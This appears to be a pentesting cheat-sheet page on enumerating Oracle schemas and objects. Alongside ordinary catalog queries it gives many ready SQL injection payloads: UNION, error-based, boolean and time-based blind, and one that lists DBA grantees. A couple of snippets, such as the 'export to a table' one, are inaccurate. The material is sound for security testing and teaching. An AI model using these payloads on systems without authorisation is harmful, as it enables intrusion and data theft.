---
title: Database Names
description: How to enumerate database names in Oracle
category: Information Gathering
order: 5
tags: ["databases", "schema", "enumeration"]
lastUpdated: 2023-03-15
---

## Database Names

In Oracle, the concept of "database names" differs from other database management systems. Oracle uses a hierarchical structure where a single database instance can contain multiple schemas (schema ≈ user). This knowledge article covers how to extract database and schema information through SQL injection.

### Oracle Database Architecture

In Oracle:
- A **database** is the overall Oracle instance
- A **schema** is a collection of database objects (tables, procedures, etc.) owned by a specific user
- By default, each user has their own schema with the same name as the username

### Current Database Context

To identify the current database context:

```sql
-- Get current database name/service name
SELECT ora_database_name FROM dual;

-- Get current instance name
SELECT instance_name FROM v$instance;

-- Get global database name
SELECT global_name FROM global_name;

-- Get database ID
SELECT dbid FROM v$database;
```

### Listing All Schemas/Users

Since Oracle schemas are tied to users, you can list all schemas by querying user information:

```sql
-- List all schemas (basic level access)
SELECT username FROM all_users ORDER BY username;

-- List schemas with creation date
SELECT username, created FROM all_users ORDER BY created;

-- Count schemas
SELECT COUNT(*) FROM all_users;
```

### Identifying Default Schemas

Oracle installations include many default schemas/users:

```sql
-- Common default schemas
SELECT username, account_status FROM all_users 
WHERE username IN (
    'SYS', 'SYSTEM', 'DBSNMP', 'SYSMAN', 'OUTLN', 'MDSYS', 
    'ORDSYS', 'ORDPLUGINS', 'CTXSYS', 'DSSYS', 'PERFSTAT', 
    'WKSYS', 'WMSYS', 'XDB', 'ANONYMOUS', 'ODM', 'ODM_MTR', 
    'OLAPSYS', 'TRACESVR', 'SCOTT'
);
```

### SQL Injection Examples

#### UNION-Based Extraction

```sql
-- Basic schemas enumeration via UNION attack
' UNION SELECT username,NULL FROM all_users--

-- Enumerating with more details
' UNION SELECT username||':'||created,NULL FROM all_users--
```

#### Error-Based Extraction

```sql
-- Error-based techniques to extract schema names
' AND CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE ROWNUM=1))=1--

-- Looping through multiple schemas using subqueries
' AND CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE username > 'A' AND ROWNUM=1))=1--
```

#### Blind Extraction Techniques

```sql
-- Boolean-based blind approach
' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--

-- Time-based blind approach
' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83 
     THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
```

### Finding Database Objects Within Schemas

Once you've identified schemas, you can enumerate their objects:

```sql
-- List tables in a specific schema (replace SCHEMA_NAME)
SELECT table_name FROM all_tables WHERE owner = 'SCHEMA_NAME';

-- List tables in all schemas
SELECT owner, table_name FROM all_tables ORDER BY owner, table_name;

-- Find tables with specific names across all schemas
SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%USER%';
```

### Finding Database Links

Database links provide connections to other Oracle databases, which can be valuable targets:

```sql
-- List database links (basic access)
SELECT * FROM all_db_links;

-- With higher privileges
SELECT * FROM dba_db_links;
```

### Pluggable Databases (Oracle 12c+)

In Oracle 12c and later, the multitenant architecture introduces pluggable databases (PDBs):

```sql
-- List pluggable databases (requires higher privileges)
SELECT name, open_mode FROM v$pdbs;

-- Get current container information
SELECT con_id, name, open_mode FROM v$containers;

-- Determine if running in multitenant mode
SELECT COUNT(*) FROM v$system_parameter WHERE name = 'enable_pluggable_database';
```

### Tablespace Information

Tablespaces are logical storage units in Oracle and can provide insights about database organization:

```sql
-- List tablespaces
SELECT tablespace_name FROM user_tablespaces;

-- With higher privileges
SELECT tablespace_name, status, contents FROM dba_tablespaces;
```

### Container Database (CDB) Information (Oracle 12c+)

In multitenant architecture, extracting container database information:

```sql
-- Check if database is a Container Database (CDB)
SELECT CDB FROM v$database;

-- Get current container name
SELECT SYS_CONTEXT('USERENV', 'CON_NAME') FROM dual;
```

### TNS Listener Information

For broader database enumeration, extracting information about configured services:

```sql
-- Service names configured in the database
SELECT name, value FROM v$parameter WHERE name LIKE '%service_name%';

-- Network configuration
SELECT * FROM v$listener_network;
```

### Practical SQL Injection Techniques

#### Data Export Approach

```sql
-- Export schema list to a table
' UNION SELECT username,'x' FROM all_users ORDER BY username;
```

#### Pagination for Large Results

```sql
-- Get schemas in batches of 10 (first page)
' UNION SELECT username,NULL FROM all_users WHERE ROWNUM <= 10--

-- Second page (schemas 11-20)
' UNION SELECT username,NULL FROM all_users WHERE ROWNUM <= 20 MINUS SELECT username,NULL FROM all_users WHERE ROWNUM <= 10--
```

#### Finding Schemas with Specific Privileges

```sql
-- Find schemas with DBA role
' UNION SELECT grantee,NULL FROM dba_role_privs WHERE granted_role='DBA'--
```

